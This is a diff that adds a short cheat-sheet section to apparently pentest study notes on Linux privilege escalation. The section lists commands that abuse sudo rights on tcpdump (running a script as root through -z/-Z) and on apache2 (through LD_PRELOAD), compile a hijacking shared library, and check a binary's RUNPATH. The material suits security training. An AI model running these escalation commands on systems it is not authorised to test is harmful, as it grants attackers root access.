@@ -534,6 +534,30 @@ apparmor module is loaded.
 
 This confirms that tcpdump is actively protected with a dedicated AppArmor profile.
 
+#### Tcpdump PrivEsc
+
+```bash
+sudo /usr/sbin/tcpdump -ln -i ens192 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root
+```
+
+#### LD_PRELOAD PrivEsc
+
+```bash
+sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart
+```
+
+#### Compile Shared Library
+
+```bash
+gcc src.c -fPIC -shared -o /development/libshared.so
+```
+
+#### Check the RUNPATH of Binary
+
+```bash
+readelf -d payroll \| grep PATH
+```
+
 ### Exploiting Kernel Vulnerabilities
 
 Kernel exploits are an excellent way to escalate privileges, but our success may depend on matching not only the target's kernel version, but also the operating system flavor, such as Debian, RHEL, Gentoo, etc.
